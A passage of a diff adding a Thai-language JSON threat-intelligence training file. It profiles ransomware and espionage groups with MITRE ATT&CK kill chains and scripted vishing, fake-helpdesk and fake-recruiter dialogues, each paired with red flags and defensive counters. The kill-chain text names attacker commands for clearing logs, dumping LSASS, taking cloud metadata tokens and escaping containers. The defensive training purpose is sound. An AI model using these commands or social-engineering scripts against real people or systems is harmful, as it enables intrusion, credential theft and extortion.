+          "ttp": "T1071.004 / T1071.003",
+          "detail": "ส่งคำสั่งและรับผลลัพธ์ผ่านระเบียน DNS TXT/A Queries หรือผ่านดราฟต์อีเมลใน Exchange Web Services (EWS)"
+        },
+        {
+          "phase": "5. Mailbox & AD Exfiltration",
+          "ttp": "T1114.002 / T1048",
+          "detail": "ส่งออกกล่องจดหมายและข้อมูลโครงสร้างเครือข่ายทั้งหมด"
+        }
+      ]
+    },
+    "G1015": {
+      "id": "G1015",
+      "name": "Scattered Spider (Octo Tempest / UNC3944 / 0ktapus)",
+      "origin": "Native English-Speaking Cybercrime Collective (US/UK)",
+      "category": "Identity & Cloud Takeover / Social Engineering & Extortion",
+      "activeSince": "2022 – ปัจจุบัน",
+      "url": "https://attack.mitre.org/groups/G1015/",
+      "target": "โทรคมนาคม, BPO/Call Center, คาสิโนและโรงแรมระดับโลก, สถาบันการเงิน, ค้าปลีก และผู้ให้บริการ SaaS/Cloud",
+      "summary": "กลุ่มอาชญากรไซเบอร์ที่ใช้ภาษาอังกฤษเป็นภาษาแม่ เชี่ยวชาญการทำ Social Engineering ขั้นสูงสุด (Vishing โทรหลอก IT Helpdesk, SIM Swapping, SMS Phishing) เพื่อยึดครองระบบ Identity (Okta / Entra ID) และเข้ารหัส VMware ESXi (ALPHV/BlackCat & RansomHub)",
+      "commStyle": "โทรศัพท์สด (Vishing) หรือส่งข้อความผ่าน SMS/Telegram/Teams ด้วยสำเนียงเจ้าของภาษา อ้างอิงข้อมูลส่วนตัวของพนักงานจริง (ชื่อหัวหน้า, รหัสพนักงาน, วันเกิด) เพื่อกดดันให้ IT Helpdesk รีเซ็ตรหัสผ่านและลงทะเบียนอุปกรณ์ MFA ใหม่ให้ทันที",
+      "campaigns": [
+        "C0027 Telecom & BPO Intrusion Campaign"
+      ],
+      "software": [
+        "AnyDesk / ScreenConnect / Pulseway RMM",
+        "ngrok / Tailscale",
+        "BlackCat / ALPHV / RansomHub ESXi Locker",
+        "LinPEAS / TruffleHog"
+      ],
+      "techniques": [
+        "T1598",
+        "T1566",
+        "T1451",
+        "T1078",
+        "T1098",
+        "T1621",
+        "T1556",
+        "T1219",
+        "T1552",
+        "T1213",
+        "T1675",
+        "T1486"
+      ],
+      "killChainSteps": [
+        {
+          "phase": "1. Helpdesk Vishing & SIM Swap",
+          "ttp": "T1598.004 / T1451 / T1621",
+          "detail": "โทรหลอกแผนก IT Helpdesk สวมรอยเป็นพนักงานระดับสูงเพื่อขอรีเซ็ต MFA หรือทำ SIM Swap / MFA Fatigue Push"
+        },
+        {
+          "phase": "2. Rogue MFA & RMM Persistence",
+          "ttp": "T1098.005 / T1219.002",
+          "detail": "ลงทะเบียนโทรศัพท์ของผู้โจมตีเข้ากับบัญชี SSO (Okta/Entra ID) และติดตั้งเครื่องมือ RMM หลายตัวพร้อมกัน"
+        },
+        {
+          "phase": "3. Internal Wiki & Repo Mining",
+          "ttp": "T1213.001 / T1213.005",
+          "detail": "ค้นหาคู่มือสถาปัตยกรรมระบบและรหัสผ่านใน Confluence, SharePoint, Slack, Microsoft Teams และ GitHub"
+        },
+        {
+          "phase": "4. Cloud & Hypervisor Pivot",
+          "ttp": "T1556.007 / T1675",
+          "detail": "ยึดครอง AWS/Azure Control Plane และล็อกอินเข้าสู่ VMware vCenter / ESXi Hypervisor"
+        },
+        {
+          "phase": "5. ESXi Encryption & Live Extortion",
+          "ttp": "T1486 / T1657",
+          "detail": "เข้ารหัส Virtual Machines บน ESXi พร้อมส่งข้อความข่มขู่ผู้บริหารโดยตรงผ่าน SMS และ Microsoft Teams"
+        }
+      ]
+    },
+    "G1046": {
+      "id": "G1046",
+      "name": "Storm-1811 (Black Basta Ransomware Affiliate)",
+      "origin": "Eastern Europe / Russian-Speaking RaaS Affiliate",
+      "category": "Teams Vishing & Ransomware Deployment",
+      "activeSince": "2024 – ปัจจุบัน",
+      "url": "https://attack.mitre.org/groups/G1046/",
+      "target": "องค์กรธุรกิจขนาดกลางและใหญ่ที่ใช้ Microsoft 365 และเปิดอนุญาต External Microsoft Teams Chat",
+      "summary": "กลุ่มผู้โจมตีที่บุกเบิกเทคนิคการถล่มอีเมลขยะหลายพันฉบับ (Email Bombing T1667) แล้วทักแชตหรือโทรผ่าน Microsoft Teams สวมรอยเป็นฝ่าย IT Helpdesk เพื่อหลอกให้เหยื่อเปิดโปรแกรม Windows Quick Assist",
+      "commStyle": "ทักแชต Microsoft Teams จากบัญชีภายนอกที่ใช้ชื่อว่า 'Help Desk Manager' หรือ 'IT Security Support' ทันทีที่เหยื่อกำลังตกใจเพราะกล่องอีเมลถูกสแปมถล่ม แล้วบอกว่าจะช่วยบล็อกสแปมให้โดยขอให้กดปุ่ม `Ctrl + Windows + Q` (Quick Assist)",
+      "campaigns": [
+        "C0037 Water Curupira Pikabot Distribution"
+      ],
+      "software": [
+        "Windows Quick Assist",
+        "QakBot / Pikabot",
+        "Cobalt Strike",
+        "SystemBC",
+        "Black Basta Ransomware"
+      ],
+      "techniques": [
+        "T1667",
+        "T1566",
+        "T1684",
+        "T1219",
+        "T1059",
+        "T1218",
+        "T1685",
+        "T1003",
+        "T1021",
+        "T1567",
+        "T1490",
+        "T1486"
+      ],
+      "killChainSteps": [
+        {
+          "phase": "1. Email Bombing Distraction",
+          "ttp": "T1667",
+          "detail": "ยิงสคริปต์สมัครรับจดหมายข่าว 3,000+ แห่งใส่อีเมลของเหยื่อภายใน 10 นาทีเพื่อสร้างความโกลาหล"
+        },
+        {
+          "phase": "2. Teams Helpdesk Impersonation",
+          "ttp": "T1566.004 / T1684.001",
+          "detail": "โทรหรือแชตผ่าน Microsoft Teams อ้างเป็นฝ่าย IT Support ของบริษัท ขอเข้าช่วยเหลือผ่านหน้าจอ"
+        },
+        {
+          "phase": "3. Quick Assist Remote Takeover",
+          "ttp": "T1219.002 / T1059.001",
+          "detail": "หลอกให้เหยื่อกด `Ctrl+Win+Q` ใส่รหัส Quick Assist 6 หลัก จากนั้นรันสคริปต์ `curl` / `msiexec` ดาวน์โหลด Payload"
+        },
+        {
+          "phase": "4. Credential Dump & AD Pivot",
+          "ttp": "T1003.001 / T1021.002",
+          "detail": "ดึงรหัสผ่านด้วย Mimikatz, ปิด EDR (T1685) และเคลื่อนย้ายผ่าน SMB/RDP ไปยัง Domain Controller"
+        },
+        {
+          "phase": "5. Black Basta Double Extortion",
+          "ttp": "T1567.002 / T1486",
+          "detail": "ขโมยข้อมูลด้วย Rclone แล้วปล่อยแรนซัมแวร์ Black Basta เข้ารหัสทั้ง Windows และ VMware ESXi"
+        }
+      ]
+    },
+    "G1024": {
+      "id": "G1024",
+      "name": "Akira Ransomware Group (GOLD SAHARA / PUNK SPIDER)",
+      "origin": "Eastern Europe (Conti Nexus)",
+      "category": "Ransomware-as-a-Service (Windows, Linux & ESXi)",
+      "activeSince": "2023 – ปัจจุบัน",
+      "url": "https://attack.mitre.org/groups/G1024/",
+      "target": "อุตสาหกรรมการผลิต, การเงิน, การศึกษา, โรงพยาบาล และองค์กรที่ใช้ VPN ที่ไม่ได้เปิด MFA",
+      "summary": "กลุ่มแรนซัมแวร์ที่ขยายตัวรวดเร็วที่สุดกลุ่มหนึ่ง มุ่งเจาะผ่านช่องโหว่และบัญชี Cisco/Fortinet/SonicWall VPN ที่ไม่มี MFA มีตัวเข้ารหัสที่เขียนด้วย C++ และ Rust สำหรับถล่มทั้งเซิร์ฟเวอร์ Windows และ VMware ESXi",
+      "commStyle": "หน้าเว็บเจรจาต่อรองบนเครือข่าย Tor ออกแบบเป็นหน้าต่าง Terminal สีเขียวย้อนยุค (Retro CLI Chat) ผู้เจรจาใช้ถ้อยคำเชิงธุรกิจผสมการกดดันเรื่องค่าปรับกฎหมายคุ้มครองข้อมูล (GDPR/PDPA) และเสนอส่วนลดหากจ่ายภายใน 48 ชั่วโมง",
+      "campaigns": [
+        "Global VPN & ESXi Double-Extortion Intrusions"
+      ],
+      "software": [
+        "Akira Windows Locker",
+        "Akira_v2 / Megazord Rust ESXi Locker",
+        "AnyDesk",
+        "Rclone",
+        "AdFind",
+        "Mimikatz"
+      ],
+      "techniques": [
+        "T1133",
+        "T1190",
+        "T1078",
+        "T1059",
+        "T1685",
+        "T1003",
+        "T1558",
+        "T1087",
+        "T1482",
+        "T1021",
+        "T1560",
+        "T1567",
+        "T1490",
+        "T1486"
+      ],
+      "killChainSteps": [
+        {
+          "phase": "1. Single-Factor VPN Breach",
+          "ttp": "T1133 / T1078.002",
+          "detail": "ล็อกอินเข้าเครือข่ายผ่าน VPN ที่ไม่มี MFA โดยใช้รหัสผ่านที่รั่วไหลจาก InfoStealer หรือช่องโหว่ CVE บนอุปกรณ์ VPN"
+        },
+        {
+          "phase": "2. BYOVD Defense Impairment",
+          "ttp": "T1685.001 / T1068",
+          "detail": "นำไดรเวอร์ที่มีช่องโหว่ (เช่น `rwdrv.sys` / `zemana.sys`) มาโหลดเพื่อสั่งปิดโปรเซสของ EDR/Antivirus จากระดับ Kernel"
+        },
+        {
+          "phase": "3. Active Directory Recon & Dump",
+          "ttp": "T1482 / T1003.001",
+          "detail": "รัน `nltest`, `AdFind` สำรวจโครงสร้างโดเมน และดัมพ์หน่วยความจำ LSASS ด้วย `comsvcs.dll`"
+        },
+        {
+          "phase": "4. Archive & Rclone Exfiltration",
+          "ttp": "T1560.001 / T1567.002",
+          "detail": "บีบอัดข้อมูลสำคัญด้วย WinRAR (`rar.exe a -hp`) แล้วอัปโหลดออกไปยัง MEGA.nz ด้วย Rclone"
+        },
+        {
+          "phase": "5. ESXi & Windows Encryption",
+          "ttp": "T1490 / T1486",
+          "detail": "ลบ Volume Shadow Copies ด้วย PowerShell WMI แล้วเข้ารหัสไฟล์ `.vmdk` บน ESXi และเซิร์ฟเวอร์ทั้งหมด"
+        }
+      ]
+    },
+    "LOCKBIT": {
+      "id": "S0002",
+      "name": "LockBit 3.0 (LockBit Black) & Modern RaaS Ecosystem",
+      "origin": "Global Ransomware-as-a-Service Syndicate",
+      "category": "Triple Extortion Ransomware Syndicate",
+      "activeSince": "2019 – ปัจจุบัน",
+      "url": "https://attack.mitre.org/software/S0002/",
+      "target": "ทุกกลุ่มอุตสาหกรรมทั่วโลก องค์กรขนาดใหญ่ โรงพยาบาล โรงงาน และผู้ให้บริการ MSP",
+      "summary": "เครือข่ายแรนซัมแวร์ที่ใช้รูปแบบ Triple Extortion (เข้ารหัสไฟล์ + ขู่เผยแพร่ข้อมูลรั่วไหล + ยิง DDoS กดดัน) เปิดให้ Affiliates นำเครื่องมือ StealBit และตัวเข้ารหัสความเร็วสูงไปใช้โจมตี",
+      "commStyle": "ใช้ระบบแชตอัตโนมัติบน Tor Negotiation Portal พร้อมนาฬิกานับถอยหลัง (Countdown Timer) ข่มขู่ว่าจะเปิดขายข้อมูลให้คู่แข่งหรือแจ้งหน่วยงานกำกับดูแลหากไม่เริ่มเจรจา",
+      "campaigns": [
+        "C0015",
+        "C0018"
+      ],
+      "software": [
+        "LockBit 3.0 / LockBit-NG-Dev",
+        "StealBit Exfiltrator",
+        "S0002 Mimikatz",
+        "S0154 Cobalt Strike",
+        "PsExec"
+      ],
+      "techniques": [
+        "T1190",
+        "T1133",
+        "T1078",
+        "T1059",
+        "T1685",
+        "T1070",
+        "T1003",
+        "T1082",
+        "T1021",
+        "T1560",
+        "T1567",
+        "T1490",
+        "T1486",
+        "T1498"
+      ],
+      "killChainSteps": [
+        {
+          "phase": "1. Initial Access Broker (IAB)",
+          "ttp": "T1133 / T1190",
+          "detail": "ซื้อสิทธิ์การเข้าถึง RDP/VPN หรือเจาะช่องโหว่เว็บ/ไฟร์วอลล์ขอบข่าย"
+        },
+        {
+          "phase": "2. Disable Security & Logs",
+          "ttp": "T1685.001 / T1685.005",
+          "detail": "ใช้ GPO ปิด Windows Defender ทั้งโดเมน และรัน `wevtutil cl` ล้าง Event Logs ทั้งหมด"
+        },
+        {
+          "phase": "3. Credential Harvesting",
+          "ttp": "T1003.001 / T1558.003",
+          "detail": "รัน Mimikatz (S0002) และทำ Kerberoasting เพื่อยึดบัญชี Domain Admin"
+        },
+        {
+          "phase": "4. StealBit Automated Exfil",
+          "ttp": "T1020 / T1567",
+          "detail": "ใช้เครื่องมือ StealBit ดึงไฟล์เอกสารออกไปยังเซิร์ฟเวอร์ของผู้โจมตีด้วยความเร็วสูง"
+        },
+        {
+          "phase": "5. GPO Mass Encryption",
+          "ttp": "T1490 / T1486",
+          "detail": "สั่งกระจายตัวเข้ารหัสผ่าน Group Policy และ PsExec ไปยังทุกเครื่องในเครือข่ายพร้อมกัน"
+        }
+      ]
+    },
+    "G0094": {
+      "id": "G0094",
+      "name": "Kimsuky (Velvet Chollima / Emerald Sleet / APT43)",
+      "origin": "North Korea",
+      "category": "Strategic Intelligence & AI-Assisted Spearphishing",
+      "activeSince": "2012 – ปัจจุบัน",
+      "url": "https://attack.mitre.org/groups/G0094/",
+      "target": "นักวิชาการด้านนโยบายต่างประเทศ, นักการทูต, สื่อมวลชน, หน่วยงานความมั่นคง และองค์กรวิจัย",
+      "summary": "กลุ่มข่าวกรองเกาหลีเหนือที่ใช้ Generative AI ช่วยร่างอีเมลเชิญสัมภาษณ์หรือขอความเห็นทางวิชาการอย่างแนบเนียน พร้อมใช้ส่วนขยายเบราว์เซอร์อันตราย (Malicious Browser Extensions) ขโมยอีเมลและคุกกี้",
+      "commStyle": "ส่งอีเมลติดต่อต่อเนื่องหลายฉบับโดยไม่ได้แนบมัลแวร์ในฉบับแรก เพื่อสร้างความไว้วางใจในฐานะนักวิจัยหรือนักข่าว ก่อนส่งลิงก์แบบฟอร์มหรือเอกสารที่ฝังสคริปต์ในภายหลัง",
+      "campaigns": [
+        "Academic & Diplomatic Credential Harvesting Operations"
+      ],
+      "software": [
+        "BabyShark",
+        "GoldDragon",
+        "RandomQuery",
+        "Malicious Chrome/Edge Extensions"
+      ],
+      "techniques": [
+        "T1682",
+        "T1683",
+        "T1598",
+        "T1566",
+        "T1059",
+        "T1176",
+        "T1218",
+        "T1539",
+        "T1114",
+        "T1071"
+      ],
+      "killChainSteps": [
+        {
+          "phase": "1. AI-Crafted Reconnaissance",
+          "ttp": "T1682 / T1683.001",
+          "detail": "ใช้บริการ LLM สาธารณะช่วยค้นคว้าข้อมูลเป้าหมายและร่างอีเมลเทียบเชิญทางวิชาการ"
+        },
+        {
+          "phase": "2. Multi-Turn Social Engineering",
+          "ttp": "T1598.003 / T1566.002",
+          "detail": "โต้ตอบอีเมลกับเหยื่อจนเหยื่อเชื่อใจ แล้วส่งลิงก์ Google Drive / OneDrive ปลอมเพื่อดักรหัสผ่าน"
+        },
+        {
+          "phase": "3. Malicious Browser Extension",
+          "ttp": "T1176.001 / T1539",
+          "detail": "หลอกติดตั้งส่วนขยายเบราว์เซอร์เพื่อดักจับ Web Session Cookies และอ่านเนื้อหา Gmail/M365 แบบเงียบๆ"
+        },
+        {
+          "phase": "4. Script Proxy Execution",
+          "ttp": "T1218.005 / T1059.005",
+          "detail": "รัน BabyShark VBS/HTA script ผ่าน `mshta.exe` เพื่อสำรวจข้อมูลเครื่อง"
+        },
+        {
+          "phase": "5. Continuous Mailbox Monitoring",
+          "ttp": "T1114.003 / T1071.001",
+          "detail": "ตั้งกฎแอบส่งต่ออีเมลและเฝ้าอ่านการสนทนาของเป้าหมายในระยะยาว"
+        }
+      ]
+    },
+    "G1056": {
+      "id": "G1056",
+      "name": "TeamPCP (Cloud-Native & AI Workload Threat Group)",
+      "origin": "Cloud-Native Cybercriminal Group",
+      "category": "Cloud, Kubernetes, CI/CD & AI Infrastructure Compromise",
+      "activeSince": "2024 – ปัจจุบัน",
+      "url": "https://attack.mitre.org/groups/G1056/",
+      "target": "คลัสเตอร์ Kubernetes, Docker API, เซิร์ฟเวอร์ AI/ML (Ray / Jupyter / Ollama), ระบบ CI/CD และ Cloud Storage",
+      "summary": "กลุ่มผู้โจมตียุค Cloud-Native ที่มุ่งเป้าสแกนหาคอนเทนเนอร์, ระบบประมวลผล AI และ Cloud APIs ที่ตั้งค่าผิดพลาด เพื่อขโมย Cloud IAM Keys, ฝังตัวใน Kubernetes และรีดไถข้อมูลบนคลาวด์",
+      "commStyle": "ทิ้งไฟล์ประกาศเรียกค่าไถ่ (Ransom Note) ไว้ใน S3 Bucket / ฐานข้อมูลที่ถูกลบหรือยึด พร้อมระบุช่องทางติดต่อผ่าน Telegram และ Session ID สำหรับเจรจา",
+      "campaigns": [
+        "C0045 ShadowRay AI Cluster Exploitation"
+      ],
+      "software": [
+        "TeamPCP Cloud Scripts",
+        "Kinsing",
+        "TruffleHog",
+        "AWS/GCP/Azure CLI"
+      ],
+      "techniques": [
+        "T1190",
+        "T1059",
+        "T1609",
+        "T1610",
+        "T1611",
+        "T1552",
+        "T1528",
+        "T1580",
+        "T1530",
+        "T1537",
+        "T1485",
+        "T1496"
+      ],
+      "killChainSteps": [
+        {
+          "phase": "1. Exposed Cloud/Container API",
+          "ttp": "T1190 / T1609",
+          "detail": "สแกนหา Docker Daemon API, Kubernetes Kubelet หรือคลัสเตอร์ AI (Ray) ที่เปิดพอร์ตโดยไม่มีการยืนยันตัวตน"
+        },
+        {
+          "phase": "2. Privileged Pod & Host Escape",
+          "ttp": "T1610 / T1611",
+          "detail": "สั่งรันคอนเทนเนอร์แบบ `--privileged` และเมาท์ดิสก์ของโฮสต์ (`/mnt/host`) เพื่อยึดเครื่องแม่ข่าย"
+        },
+        {
+          "phase": "3. IMDS & Secret Harvesting",
+          "ttp": "T1552.005 / T1552.007",
+          "detail": "ดึงโทเคน IAM Role จาก Cloud Metadata API (`169.254.169.254`) และกวาดหาคีย์ใน Kubernetes Secrets"
+        },
+        {
+          "phase": "4. Cross-Account Cloud Exfil",
+          "ttp": "T1530 / T1537",
+          "detail": "ใช้คีย์ที่ได้คัดลอกข้อมูลจาก S3 / Blob Storage ข้ามไปยังบัญชีคลาวด์ของผู้โจมตีโดยตรง"
+        },
+        {
+          "phase": "5. Cloud Bucket Wipe & Extortion",
+          "ttp": "T1485.001 / T1496.001",
+          "detail": "ตั้งกฎ Lifecycle ลบข้อมูลหรือรันเหมืองขุดคริปโต/LLM Hijacking บนทรัพยากรคลาวด์ของเหยื่อ"
+        }
+      ]
+    }
+  },
+  "adversaryCommunications": [
+    {
+      "id": "COMM-01",
+      "title": "1. บทสนทนา Vishing & แชตหลอก IT Helpdesk เพื่อรีเซ็ต MFA (Scattered Spider G1015)",
+      "group": "G1015 Scattered Spider (Octo Tempest)",
+      "channel": "📞 โทรศัพท์สด (Vishing) + 🎫 ระบบ IT Service Desk Chat",
+      "mitreTags": [
+        "T1598.004",
+        "T1684.001",
+        "T1098.005",
+        "T1078.004"
+      ],
+      "scenarioSummary": "ผู้โจมตีค้นหาข้อมูลพนักงานระดับ Senior Engineer จาก LinkedIn และฐานข้อมูลที่รั่วไหล (ชื่อ-นามสกุล, รหัสพนักงาน, วันเกิด, ชื่อหัวหน้างาน) แล้วโทรและทักแชตหาแผนก IT Helpdesk ในช่วงเปลี่ยนกะ โดยอ้างว่าเพิ่งเปลี่ยนโทรศัพท์มือถือใหม่และเข้าแอป Okta Verify / Microsoft Authenticator ไม่ได้",
+      "messages": [
+        {
+          "speaker": "attacker",
+          "role": "🕵️ ผู้โจมตี (สวมรอยเป็น 'คุณอเล็กซ์ - Senior Cloud Architect')",
+          "time": "21:42 น.",
+          "text": "สวัสดีครับทีม Helpdesk ผมอเล็กซ์จากทีม Cloud Infra นะครับ พอดีโทรศัพท์เครื่องเก่าผมหน้าจอแตกเปิดไม่ติดเลย เพิ่งย้ายซิมมาใส่เครื่องใหม่ ตอนนี้จะล็อกอินเข้า Okta ไปแก้ Incident ด่วนของลูกค้าแต่ติดหน้า MFA Push ครับ ช่วยรีเซ็ต MFA Device ให้ผมหน่อยได้ไหมครับ?",
+          "tacticNote": "T1598.004 / T1684.001: สร้างสถานการณ์เร่งด่วน (Urgency) นอกเวลาทำการปกติเพื่อกดดันเจ้าหน้าที่"
+        },
+        {
+          "speaker": "target",
+          "role": "👨‍💻 เจ้าหน้าที่ IT Helpdesk",
+          "time": "21:43 น.",
+          "text": "สวัสดีครับคุณอเล็กซ์ เพื่อยืนยันตัวตน รบกวนแจ้งรหัสพนักงาน 6 หลัก วันเดือนปีเกิด และชื่อผู้จัดการโดยตรงของคุณด้วยครับ",
+          "tacticNote": "ช่องโหว่กระบวนการ: ใช้คำถามยืนยันตัวตนแบบ Static Knowledge-Based Authentication (KBA) ซึ่งหาได้จาก OSINT/Breach Data"
+        },
+        {
+          "speaker": "attacker",
+          "role": "🕵️ ผู้โจมตี (ใช้ข้อมูลจาก OSINT & Breach Dump)",
+          "time": "21:44 น.",
+          "text": "รหัสพนักงาน EMP-408921 ครับ เกิดวันที่ 14 สิงหาคม 1988 หัวหน้าผมคือคุณเดวิด เฉิน (VP of Engineering) ครับ รบกวนส่งลิงก์ลงทะเบียน QR Code อันใหม่มาที่หน้าจอหรือเปิด Temporary Pass ให้เลยนะครับ ตอนนี้ทีมรอผมเข้า AWS Production อยู่คนเดียวเลย",
+          "tacticNote": "T1589.001/.003: ใช้ข้อมูลที่รวบรวมไว้ในขั้น Reconnaissance ตอบได้อย่างแม่นยำและเร่งรัด"
+        },
+        {
+          "speaker": "target",
+          "role": "👨‍💻 เจ้าหน้าที่ IT Helpdesk (หลงเชื่อหากไม่มีนโยบาย Out-of-Band Video Check)",
+          "time": "21:45 น.",
+          "text": "ข้อมูลถูกต้องครับ ผมกด Clear Existing MFA Factors และส่งลิงก์ Enroll อุปกรณ์ใหม่ให้เรียบร้อยแล้วครับ ลองสแกน QR Code จากหน้าล็อกอินได้เลยครับ",
+          "tacticNote": "T1098.005 (Device Registration): ทันทีที่ Helpdesk กดรีเซ็ต ผู้โจมตีที่เปิดหน้าล็อกอินรออยู่จะสแกน QR Code ผูกแอป Authenticator ของตนเองสำเร็จทันที!"
+        }
+      ],
+      "redFlags": [
+        "คำขอรีเซ็ต MFA นอกเวลาทำการพร้อมอ้างเหตุฉุกเฉินเร่งด่วน",
+        "อ้างว่าอุปกรณ์พัง/หายทำให้ไม่สามารถรับสายหรือกดอนุมัติจากอุปกรณ์เดิมได้",
+        "การพึ่งพาเฉพาะข้อมูลพื้นฐาน (รหัสพนักงาน/วันเกิด/ชื่อหัวหน้า) ที่อาจรั่วไหลแล้ว"
+      ],
+      "blueCounter": "บังคับใช้มาตรการยืนยันตัวตนแบบเปิดกล้องวิดีโอคอลเห็นหน้าจริงพร้อมบัตรพนักงาน (Live Video Verification) และต้องมีการกดอนุมัติในระบบจากหัวหน้างานโดยตรง (Manager Approval Workflow) ก่อนรีเซ็ต MFA ทุกครั้ง"
+    },
+    {
+      "id": "COMM-02",
+      "title": "2. แชต Microsoft Teams ปลอมเป็นฝ่าย IT ล่อให้เปิด Quick Assist หลังถล่มอีเมล (Storm-1811 / Black Basta G1046)",
+      "group": "G1046 Storm-1811 (Black Basta Affiliate)",
+      "channel": "💬 Microsoft Teams (External Tenant Chat & Audio Call)",
+      "mitreTags": [
+        "T1667",
+        "T1566.004",
+        "T1219.002",
+        "T1059.001"
+      ],
+      "scenarioSummary": "ผู้โจมตีใช้บอตยิงสแปมสมัครจดหมายข่าว 3,500 ฉบับเข้ากล่องอีเมลของพนักงานการเงินภายใน 5 นาที (Email Bombing T1667) จากนั้นทักแชตผ่าน Microsoft Teams โดยใช้ชื่อบัญชีภายนอกว่า 'IT Security Helpdesk' เพื่อเสนอตัวเข้าแก้ไขปัญหา",
+      "messages": [
+        {
+          "speaker": "attacker",
+          "role": "🕵️ ผู้โจมตี (บัญชี External Teams: 'IT Helpdesk - Security Operations [External]')",
+          "time": "10:15 น.",
+          "text": "⚠️ แจ้งเตือนด่วนจากแผนก IT Security: ระบบตรวจพบว่ากล่องอีเมลของคุณกำลังถูกโจมตีด้วย Spam Flood (กว่า 3,000 ฉบับ) และมีความเสี่ยงที่มัลแวร์จะแฝงตัวเข้ามา คุณได้รับอีเมลรบกวนจำนวนมากใช่ไหมครับ?",
+          "tacticNote": "T1667 + T1684.001: ผู้โจมตีเป็นผู้สร้างปัญหา Email Bombing เอง แล้วทักเข้ามาสวมบทเป็นผู้ช่วยชีวิตทันที"
+        },
+        {
+          "speaker": "target",
+          "role": "👩‍💼 พนักงานฝ่ายการเงิน",
+          "time": "10:16 น.",
+          "text": "ใช่ค่ะ! อีเมลเด้งรัวมากจน Outlook ค้างไปหมดแล้ว พอดีกำลังจะโอนจ่ายงวดงานด้วย ช่วยแก้ไขด่วนเลยค่ะ",
+          "tacticNote": "เหยื่อเกิดความตื่นตระหนกและต้องการให้ปัญหาจบเร็วที่สุด"
+        },
+        {
+          "speaker": "attacker",
+          "role": "🕵️ ผู้โจมตี (IT Helpdesk ปลอม)",
+          "time": "10:17 น.",
+          "text": "ไม่ต้องกังวลครับ เดี๋ยววิศวกรจะรีเซ็ตตัวกรอง Spam Quarantine บนเครื่องของคุณให้ทันที รบกวนกดปุ่มลัดบนคีย์บอร์ด `Ctrl + Windows + Q` เพื่อเปิดโปรแกรมช่วยเหลือมาตรฐานของ Microsoft (Quick Assist) แล้วกรอกรหัสความปลอดภัย 6 หลักนี้ครับ: `849-204` จากนั้นกด Allow ได้เลยครับ",
+          "tacticNote": "T1219.002 (Remote Desktop Software): ใช้ Windows Quick Assist ที่ติดตั้งมากับ Windows 10/11 ทุกเครื่องเพื่อไม่ต้องหลอกให้ดาวน์โหลดไฟล์ .exe"
+        },
+        {
+          "speaker": "attacker",
+          "role": "🕵️ ผู้โจมตี (หลังเข้าควบคุมหน้าจอได้แล้ว)",
+          "time": "10:19 น.",
+          "text": "ตอนนี้ระบบกำลังรันสคริปต์อัปเดตความปลอดภัย หน้าจออาจจะมืดลงประมาณ 1 นาที ห้ามปิดเครื่องนะครับ... (เบื้องหลังแอบเปิด cmd/powershell รัน `curl` ดึงไฟล์ `.msi` / Cobalt Strike Beacon และดัมพ์ LSASS)",
+          "tacticNote": "T1059.001 / T1218.007: ใช้ฟีเจอร์เพิกเฉยหน้าจอเพื่อรันคำสั่งติดตั้ง C2 Beacon และขโมยรหัสผ่านโดเมน"
+        }
+      ],
+      "redFlags": [
+        "มีป้าย `[External]` ต่อท้ายชื่อผู้ติดต่อใน Microsoft Teams แม้รูปโปรไฟล์และชื่อจะเขียนว่า IT Helpdesk",
+        "เกิดเหตุอีเมลสแปมถล่ม (Email Bombing) ก่อนมีคนทักแชตเข้ามาเสนอความช่วยเหลือทันที",
+        "ขอให้เปิดโปรแกรม `Quick Assist` (`Ctrl+Win+Q`) หรือ `AnyDesk`"
+      ],
+      "blueCounter": "ปิดการรับแชตจากโดเมนภายนอกที่ไม่อยู่ใน Allowlist บน Microsoft Teams (`External Access = Blocked/Allowlist Only`), บล็อกการรัน `QuickAssist.exe` ด้วย AppLocker/WDAC และตั้งกฎ SIEM จับ Inbound Email Spike (T1667)"
+    },
+    {
+      "id": "COMM-03",
+      "title": "3. บทสนทนาหลอกสัมภาษณ์งานสาย Tech & ให้รันโค้ดทดสอบบน GitHub (Lazarus / Contagious Interview G1052)",
+      "group": "G1052 Contagious Interview & G0032 Lazarus Group",
+      "channel": "💼 LinkedIn Messaging + 🐙 GitHub / Telegram",
+      "mitreTags": [
+        "T1585.001",
+        "T1598.001",
+        "T1204.005",
+        "T1059.007",
+        "T1555.003"
+      ],
+      "scenarioSummary": "ผู้โจมตีปลอมตัวเป็น Senior Recruiter ของบริษัท Web3/FinTech/AI ระดับโลก ทักหา Senior Developer ชาวไทย/สากล เสนอผลตอบแทนสูง ($180k–$250k Remote) และขอให้ทำ Live Coding Test ด้วยการโคลนโปรเจกต์ Node.js จาก GitHub มารันบนเครื่อง",
+      "messages": [
+        {
+          "speaker": "attacker",
+          "role": "🕵️ ผู้โจมตี (LinkedIn: 'Sarah Jenkins - Head of Talent @ DeFi-Nexus Labs')",
+          "time": "14:10 น.",
+          "text": "Hi! เราประทับใจผลงานใน GitHub ของคุณมาก ตอนนี้เรากำลังขยายทีม Core Platform (Remote 100%, เงินเดือน $190,000 + Token Bonus) ขั้นตอนแรกไม่มีข้อสอบอัลกอริทึมน่าเบื่อค่ะ เพียงแค่ลองรัน Demo โปรเจกต์ของเราและแก้ Bug หน้า UI เล็กน้อยก่อนคุยกับ CTO พรุ่งนี้ สนใจไหมคะ?",
+          "tacticNote": "T1585.001 / T1683.001: ใช้ข้อเสนอเงินเดือนสูงและขั้นตอนสัมภาษณ์ที่ดูทันสมัยดึงดูดนักพัฒนา"
+        },
+        {
+          "speaker": "target",
+          "role": "👨‍💻 Senior Full-Stack Developer",
+          "time": "14:15 น.",
+          "text": "สนใจครับ ส่งลิงก์ Repository และรายละเอียดงานมาได้เลยครับ",
+          "tacticNote": "นักพัฒนามักคุ้นชินกับการ git clone และ npm install โค้ดจาก GitHub อยู่แล้ว"
+        },
+        {
+          "speaker": "attacker",
+          "role": "🕵️ ผู้โจมตี (ส่งลิงก์ GitHub Repo ฝังมัลแวร์ BeaverTail)",
+          "time": "14:16 น.",
+          "text": "นี่คือลิงก์ Repo ค่ะ: `github.com/defi-nexus-assessment/dex-portal-v2` (รหัสผ่านแตกไฟล์เอกสารบรีฟคือ `Nexus2026!`) ให้รัน `npm install && npm run dev` บนเครื่องของคุณได้เลยนะคะ ถ้าหน้าเว็บขึ้นแล้วแคปหน้าจอมาบอกด้วยค่ะ!",
+          "tacticNote": "T1204.005 (Malicious Library) / T1059.007: ในไฟล์ `package.json` มีสคริปต์ `postinstall` หรือไฟล์ `server/routes/api.js` ที่ยัดโค้ด Obfuscated JS ยาวหลายพันตัวอักษรไว้ด้านขวาสุดของบรรทัด"
+        },
+        {
